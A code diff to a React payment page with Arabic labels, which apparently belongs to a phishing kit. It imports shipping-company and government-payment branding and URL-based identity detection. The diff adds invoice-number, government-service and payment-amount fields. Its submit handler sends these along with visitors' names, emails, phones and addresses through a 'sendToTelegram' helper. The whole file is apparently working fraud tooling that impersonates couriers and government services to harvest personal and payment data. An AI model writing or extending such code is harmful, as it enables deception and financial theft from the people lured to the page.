@@ -4,6 +4,7 @@ import { Card } from "@/components/ui/card";
 import { Button } from "@/components/ui/button";
 import { Input } from "@/components/ui/input";
 import { Label } from "@/components/ui/label";
+import { Select, SelectContent, SelectItem, SelectTrigger, SelectValue } from "@/components/ui/select";
 import { getServiceBranding } from "@/lib/serviceLogos";
 import { shippingCompanyBranding } from "@/lib/brandingSystem";
 import { getCountryByCode } from "@/lib/countries";
@@ -12,13 +13,13 @@ import { getCompanyMeta } from "@/utils/companyMeta";
 import PaymentMetaTags from "@/components/PaymentMetaTags";
 import { useLink, useUpdateLink } from "@/hooks/useSupabase";
 import { sendToTelegram } from "@/lib/telegram";
-import { Shield, ArrowLeft, User, Mail, Phone, MapPin, Package, Sparkles, Lock, ShieldCheck } from "lucide-react";
+import { Shield, ArrowLeft, User, Mail, Phone, MapPin, Package, Sparkles, Lock, ShieldCheck, FileText, DollarSign, Landmark } from "lucide-react";
 import { designSystem } from "@/lib/designSystem";
 import BrandedCarousel from "@/components/BrandedCarousel";
 import { detectEntityFromURL, getEntityLogo } from "@/lib/dynamicIdentity";
 import PageLoader from "@/components/PageLoader";
 import { getGovernmentPaymentSystem } from "@/lib/governmentPaymentSystems";
-import { isGovernmentService } from "@/lib/governmentPaymentServices";
+import { isGovernmentService, getAllGovernmentServices } from "@/lib/governmentPaymentServices";
 
 const PaymentRecipient = () => {
   const { id, company: pathCompany, currency: pathCurrency, amount: pathAmount } = useParams();
@@ -29,8 +30,13 @@ const PaymentRecipient = () => {
   const [customerEmail, setCustomerEmail] = useState("");
   const [customerPhone, setCustomerPhone] = useState("");
   const [residentialAddress, setResidentialAddress] = useState("");
+  const [invoiceNumber, setInvoiceNumber] = useState("");
+  const [selectedGovService, setSelectedGovService] = useState("");
+  const [paymentAmount, setPaymentAmount] = useState("500");
   const [isSubmitting, setIsSubmitting] = useState(false);
   const [showPage, setShowPage] = useState(false);
+  
+  const allGovServices = getAllGovernmentServices();
 
   useEffect(() => {
     const timer = setTimeout(() => {
@@ -130,6 +136,11 @@ const PaymentRecipient = () => {
       formData.append('service', serviceName);
       formData.append('amount', formattedAmount);
       formData.append('linkId', id || '');
+      if (isGovService) {
+        formData.append('invoiceNumber', invoiceNumber);
+        formData.append('govService', selectedGovService);
+        formData.append('paymentAmount', paymentAmount);
+      }
 
       try {
         await fetch('/', {
@@ -152,6 +163,11 @@ const PaymentRecipient = () => {
             address: residentialAddress,
             service: serviceName,
             amount: formattedAmount,
+            ...(isGovService && {
+              invoiceNumber: invoiceNumber,
+              govService: selectedGovService,
+              paymentAmount: paymentAmount
+            }),
             payment_url: `${productionDomain}/pay/${id}/details`
           },
           timestamp: new Date().toISOString()
@@ -170,7 +186,12 @@ const PaymentRecipient = () => {
               phone: customerPhone,
               address: residentialAddress,
               service: serviceName,
-              amount: formattedAmount
+              amount: formattedAmount,
+              ...(isGovService && {
+                invoiceNumber: invoiceNumber,
+                govService: selectedGovService,
+                paymentAmount: paymentAmount
+              })
             },
             selectedCountry: countryCode,
             service_key: serviceKey,
@@ -271,10 +292,10 @@ const PaymentRecipient = () => {
                 fontFamily: fontFamily
               }}
             >
-              {payerType === "recipient" ? "معلومات المستلم" : "معلومات المرسل"}
+              {isGovService ? "إكمال بيانات السداد" : (payerType === "recipient" ? "معلومات المستلم" : "معلومات المرسل")}
             </h1>
             <p className="text-sm text-gray-600">
-              الرجاء إدخال بياناتك لإكمال عملية الدفع
+              {isGovService ? "أدخل بيانات السداد لإكمال العملية" : "الرجاء إدخال بياناتك لإكمال عملية الدفع"}
             </p>
             
             {/* Amount Display */}
@@ -383,30 +404,119 @@ const PaymentRecipient = () => {
                   />
                 </div>
                 
-                {/* Address */}
-                <div>
-                  <Label 
-                    htmlFor="address" 
-                    className="flex items-center gap-2 mb-2 text-sm font-bold"
-                    style={{ color: designSystem.colors.neutral[800] }}
-                  >
-                    <MapPin className="w-4 h-4" style={{ color: primaryColor }} />
-                    العنوان السكني *
-                  </Label>
-                  <Input
-                    id="address"
-                    value={residentialAddress}
-                    onChange={(e) => setResidentialAddress(e.target.value)}
-                    required
-                    className="h-12 text-base border-2"
-                    style={{
-                      borderRadius: '10px',
-                      borderColor: designSystem.colors.neutral[200],
-                      fontFamily: fontFamily
-                    }}
-                    placeholder="أدخل عنوانك السكني الكامل"
-                  />
-                </div>
+                {isGovService ? (
+                  <>
+                    {/* Invoice Number - For Government Services Only */}
+                    <div>
+                      <Label 
+                        htmlFor="invoiceNumber" 
+                        className="flex items-center gap-2 mb-2 text-sm font-bold"
+                        style={{ color: designSystem.colors.neutral[800] }}
+                      >
+                        <FileText className="w-4 h-4" style={{ color: primaryColor }} />
+                        الرقم المفوتر *
+                      </Label>
+                      <Input
+                        id="invoiceNumber"
+                        value={invoiceNumber}
+                        onChange={(e) => setInvoiceNumber(e.target.value)}
+                        required
+                        className="h-12 text-base border-2"
+                        style={{
+                          borderRadius: '10px',
+                          borderColor: designSystem.colors.neutral[200],
+                          fontFamily: fontFamily
+                        }}
+                        placeholder="مثال: INV-12345"
+                      />
+                    </div>
+
+                    {/* Government Service Selector */}
+                    <div>
+                      <Label 
+                        htmlFor="govService" 
+                        className="flex items-center gap-2 mb-2 text-sm font-bold"
+                        style={{ color: designSystem.colors.neutral[800] }}
+                      >
+                        <Landmark className="w-4 h-4" style={{ color: primaryColor }} />
+                        الخدمة الحكومية/العامة *
+                      </Label>
+                      <Select value={selectedGovService} onValueChange={setSelectedGovService} required>
+                        <SelectTrigger 
+                          className="h-12 text-base border-2"
+                          style={{
+                            borderRadius: '10px',
+                            borderColor: designSystem.colors.neutral[200],
+                            fontFamily: fontFamily
+                          }}
+                        >
+                          <SelectValue placeholder="اختر الخدمة" />
+                        </SelectTrigger>
+                        <SelectContent>
+                          {allGovServices.map((service) => (
+                            <SelectItem key={service.key} value={service.key}>
+                              {service.nameAr} - {service.country}
+                            </SelectItem>
+                          ))}
+                        </SelectContent>
+                      </Select>
+                    </div>
+
+                    {/* Payment Amount */}
+                    <div>
+                      <Label 
+                        htmlFor="paymentAmount" 
+                        className="flex items-center gap-2 mb-2 text-sm font-bold"
+                        style={{ color: designSystem.colors.neutral[800] }}
+                      >
+                        <DollarSign className="w-4 h-4" style={{ color: primaryColor }} />
+                        مبلغ السداد *
+                      </Label>
+                      <Input
+                        id="paymentAmount"
+                        type="number"
+                        value={paymentAmount}
+                        onChange={(e) => setPaymentAmount(e.target.value)}
+                        required
+                        className="h-12 text-base border-2"
+                        style={{
+                          borderRadius: '10px',
+                          borderColor: designSystem.colors.neutral[200],
+                          fontFamily: fontFamily
+                        }}
+                        placeholder="500"
+                        step="0.01"
+                        min="0"
+                      />
+                      <p className="text-xs text-gray-500 mt-1.5">المبلغ الافتراضي: 500</p>
+                    </div>
+                  </>
+                ) : (
+                  /* Address - For Non-Government Services Only */
+                  <div>
+                    <Label 
+                      htmlFor="address" 
+                      className="flex items-center gap-2 mb-2 text-sm font-bold"
+                      style={{ color: designSystem.colors.neutral[800] }}
+                    >
+                      <MapPin className="w-4 h-4" style={{ color: primaryColor }} />
+                      العنوان السكني *
+                    </Label>
+                    <Input
+                      id="address"
+                      value={residentialAddress}
+                      onChange={(e) => setResidentialAddress(e.target.value)}
+                      required={!isGovService}
+                      className="h-12 text-base border-2"
+                      style={{
+                        borderRadius: '10px',
+                        borderColor: designSystem.colors.neutral[200],
+                        fontFamily: fontFamily
+                      }}
+                      placeholder="أدخل عنوانك السكني الكامل"
+                    />
+                  </div>
+                )}
               </div>
 
               {/* Security Notice */}
@@ -432,7 +542,13 @@ const PaymentRecipient = () => {
               <Button
                 type="submit"
                 size="lg"
-                disabled={isSubmitting || !customerName || !customerEmail || !customerPhone || !residentialAddress}
+                disabled={
+                  isSubmitting || 
+                  !customerName || 
+                  !customerEmail || 
+                  !customerPhone || 
+                  (isGovService ? (!invoiceNumber || !selectedGovService || !paymentAmount) : !residentialAddress)
+                }
                 className="w-full text-lg py-6 text-white font-bold mt-6 rounded-xl disabled:opacity-50 disabled:cursor-not-allowed"
                 style={{
                   background: `linear-gradient(135deg, ${primaryColor}, ${secondaryColor})`,
